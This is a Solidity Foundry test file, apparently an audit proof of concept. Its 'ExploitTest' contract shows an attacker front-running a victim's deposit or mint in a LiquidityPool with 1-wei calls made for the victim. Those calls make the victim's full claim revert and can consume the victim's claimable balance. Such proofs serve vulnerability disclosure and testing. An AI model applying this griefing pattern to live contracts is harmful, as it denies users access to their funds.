// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "../../src/LiquidityPool.sol";

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    string public name = "Mock Asset";
    string public symbol = "MASSET";
    uint8 public decimals = 18;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract MockTrancheToken is TrancheTokenLike {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    string public name = "Mock Tranche";
    string public symbol = "MTRANCHE";
    uint8 public decimals = 18;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function checkTransferRestriction(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external pure {}
    function PERMIT_TYPEHASH() external pure returns (bytes32) { return bytes32(0); }
    function DOMAIN_SEPARATOR() external pure returns (bytes32) { return bytes32(0); }
}

contract MockInvestmentManager is InvestmentManagerLike {
    mapping(address => mapping(address => uint256)) public claimableDeposits;
    mapping(address => mapping(address => uint256)) public claimableMints;
    MockERC20 public asset;
    MockTrancheToken public share;

    constructor(address _asset, address _share) {
        asset = MockERC20(_asset);
        share = MockTrancheToken(_share);
    }

    function setClaimableDeposit(address user, address pool, uint256 amount) external {
        claimableDeposits[user][pool] = amount;
    }

    function setClaimableMint(address user, address pool, uint256 amount) external {
        claimableMints[user][pool] = amount;
    }

    function processDeposit(address receiver, uint256 assets) external returns (uint256 shares) {
        require(claimableDeposits[receiver][msg.sender] >= assets, "InvestmentManager/exceeds-claimable-amount");
        claimableDeposits[receiver][msg.sender] -= assets;
        shares = assets;
        share.mint(receiver, shares);
        return shares;
    }

    function processMint(address receiver, uint256 shares) external returns (uint256 assets) {
        require(claimableMints[receiver][msg.sender] >= shares, "InvestmentManager/exceeds-claimable-shares");
        claimableMints[receiver][msg.sender] -= shares;
        assets = shares;
        share.mint(receiver, shares);
        return assets;
    }

    function processWithdraw(uint256, address, address) external pure returns (uint256) {
        return 0;
    }

    function processRedeem(uint256, address, address) external pure returns (uint256) {
        return 0;
    }

    function maxDeposit(address user, address pool) external view returns (uint256) {
        return claimableDeposits[user][pool];
    }

    function maxMint(address user, address pool) external view returns (uint256) {
        return claimableMints[user][pool];
    }

    function maxWithdraw(address, address) external pure returns (uint256) {
        return 0;
    }

    function maxRedeem(address, address) external pure returns (uint256) {
        return 0;
    }

    function totalAssets(uint256, address) external pure returns (uint256) {
        return 0;
    }

    function convertToShares(uint256 assets, address) external pure returns (uint256) {
        return assets;
    }

    function convertToAssets(uint256 shares, address) external pure returns (uint256) {
        return shares;
    }

    function previewDeposit(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }

    function previewMint(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function previewWithdraw(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }

    function previewRedeem(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function requestRedeem(uint256, address) external pure {}
    function requestDeposit(uint256, address) external pure {}
    function collectDeposit(address) external pure {}
    function collectRedeem(address) external pure {}
    function decreaseDepositRequest(uint256, address) external pure {}
    function decreaseRedeemRequest(uint256, address) external pure {}
}

contract ExploitTest is Test {
    LiquidityPool public pool;
    MockERC20 public asset;
    MockTrancheToken public share;
    MockInvestmentManager public investmentManager;

    address public victim = address(0x1234);
    address public attacker = address(0x5678);

    function setUp() public {
        asset = new MockERC20();
        share = new MockTrancheToken();
        investmentManager = new MockInvestmentManager(address(asset), address(share));
        
        pool = new LiquidityPool(
            1,
            bytes16(uint128(1)),
            address(asset),
            address(share),
            address(investmentManager)
        );

        pool.rely(address(investmentManager));
        
        asset.mint(victim, 1000000 ether);
        asset.mint(attacker, 1 ether);
    }

    function testDepositFrontRunningDoS() public {
        uint256 victimDepositAmount = 1000000 ether;
        
        investmentManager.setClaimableDeposit(victim, address(pool), victimDepositAmount);
        
        uint256 victimSharesBefore = share.balanceOf(victim);
        assertEq(victimSharesBefore, 0, "Victim should have no shares initially");
        
        vm.prank(attacker);
        pool.deposit(1 wei, victim);
        
        uint256 victimSharesAfterAttack = share.balanceOf(victim);
        assertEq(victimSharesAfterAttack, 1 wei, "Victim should have 1 wei shares after attacker front-run");
        
        vm.prank(victim);
        vm.expectRevert("InvestmentManager/exceeds-claimable-amount");
        pool.deposit(victimDepositAmount, victim);
        
        uint256 remainingClaimable = investmentManager.maxDeposit(victim, address(pool));
        assertEq(remainingClaimable, victimDepositAmount - 1 wei, "Victim can only claim reduced amount");
    }

    function testMintFrontRunningDoS() public {
        uint256 victimMintAmount = 1000000 ether;
        
        investmentManager.setClaimableMint(victim, address(pool), victimMintAmount);
        
        uint256 victimSharesBefore = share.balanceOf(victim);
        assertEq(victimSharesBefore, 0, "Victim should have no shares initially");
        
        vm.prank(attacker);
        pool.mint(1 wei, victim);
        
        uint256 victimSharesAfterAttack = share.balanceOf(victim);
        assertEq(victimSharesAfterAttack, 1 wei, "Victim should have 1 wei shares after attacker front-run");
        
        vm.prank(victim);
        vm.expectRevert("InvestmentManager/exceeds-claimable-shares");
        pool.mint(victimMintAmount, victim);
        
        uint256 remainingClaimable = investmentManager.maxMint(victim, address(pool));
        assertEq(remainingClaimable, victimMintAmount - 1 wei, "Victim can only claim reduced amount");
    }

    function testRepeatedGriefingAttack() public {
        uint256 victimDepositAmount = 1000 ether;
        
        investmentManager.setClaimableDeposit(victim, address(pool), victimDepositAmount);
        
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(attacker);
            pool.deposit(1 wei, victim);
        }
        
        uint256 victimShares = share.balanceOf(victim);
        assertEq(victimShares, 10 wei, "Victim should have 10 wei shares after 10 attacks");
        
        uint256 remainingClaimable = investmentManager.maxDeposit(victim, address(pool));
        assertEq(remainingClaimable, victimDepositAmount - 10 wei, "Victim claimable reduced by 10 wei");
        
        vm.prank(victim);
        vm.expectRevert("InvestmentManager/exceeds-claimable-amount");
        pool.deposit(victimDepositAmount, victim);
    }

    function testAttackerCanDepositForAnyReceiver() public {
        uint256 depositAmount = 100 ether;
        
        investmentManager.setClaimableDeposit(victim, address(pool), depositAmount);
        
        vm.prank(attacker);
        uint256 shares = pool.deposit(depositAmount, victim);
        
        assertEq(shares, depositAmount, "Attacker successfully deposited for victim");
        assertEq(share.balanceOf(victim), depositAmount, "Victim received shares from attacker's call");
        assertEq(investmentManager.maxDeposit(victim, address(pool)), 0, "All claimable deposits consumed");
    }

    function testAttackerCanMintForAnyReceiver() public {
        uint256 mintAmount = 100 ether;
        
        investmentManager.setClaimableMint(victim, address(pool), mintAmount);
        
        vm.prank(attacker);
        uint256 assets = pool.mint(mintAmount, victim);
        
        assertEq(assets, mintAmount, "Attacker successfully minted for victim");
        assertEq(share.balanceOf(victim), mintAmount, "Victim received shares from attacker's call");
        assertEq(investmentManager.maxMint(victim, address(pool)), 0, "All claimable mints consumed");
    }
}
